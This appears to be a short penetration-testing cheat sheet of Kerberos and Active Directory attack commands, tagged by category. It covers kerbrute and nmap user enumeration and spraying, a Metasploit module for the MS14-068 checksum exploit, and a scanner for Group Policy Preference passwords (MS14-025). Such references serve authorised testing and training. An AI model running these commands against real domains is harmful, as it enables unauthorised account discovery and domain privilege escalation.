# kerberos

% kerberos

## Kerbrute usersenum
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```
./kerbrute_linux_amd64 userenum -d <domain> --dc <ip> <users_file>
```

## kerberos enum users
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/RECON 
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'" <ip>
```

## kerberos enum users (with user list)
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
```

## kerberos ms14-068
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/EXPLOIT 
```
msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
```

## exploit gpp - group policy preference (ms14-025)
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/RECON 
```
msfconsole -x "use scanner/smb/smb_enum_gpp"
```
